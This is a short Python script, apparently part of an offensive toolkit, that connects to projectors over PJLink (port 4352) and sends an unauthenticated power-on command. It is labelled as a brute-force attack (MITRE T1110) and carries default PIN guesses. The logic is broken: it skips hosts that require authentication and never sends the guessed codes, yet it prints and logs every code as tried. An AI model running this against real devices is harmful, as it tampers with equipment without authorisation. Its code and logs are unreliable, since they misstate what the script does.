# modules/exploits/projector_brute_on.py

import socket
import argparse
from datetime import datetime
import json
import os

PJLINK_PORT = 4352
LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T1110"  # Brute Force

def log_event(ip, tried_codes):
    os.makedirs("results", exist_ok=True)
    data = []
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    data.append({
        "timestamp": datetime.utcnow().isoformat(),
        "target": ip,
        "attempts": tried_codes,
        "ttp": MITRE_TTP
    })
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def brute_projector(ip, codes):
    tried = []
    for code in codes:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((ip, PJLINK_PORT))
            banner = s.recv(1024).decode()
            if "PJLINK 1" in banner:
                auth_required = True
                s.close()
                continue
            s.sendall(f"%1POWR 1\r".encode())
            response = s.recv(1024).decode()
            print(f"[+] Code tried: {code} â†’ Response: {response.strip()}")
            tried.append(code)
            s.close()
        except Exception:
            continue
    log_event(ip, tried)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Projector Brute-On Trigger")
    parser.add_argument("--ip", required=True, help="Projector IP")
    parser.add_argument("--codes", nargs="+", required=False, default=["0000", "1234", "admin"], help="PIN/password guesses")
    args = parser.parse_args()

    brute_projector(args.ip, args.codes)
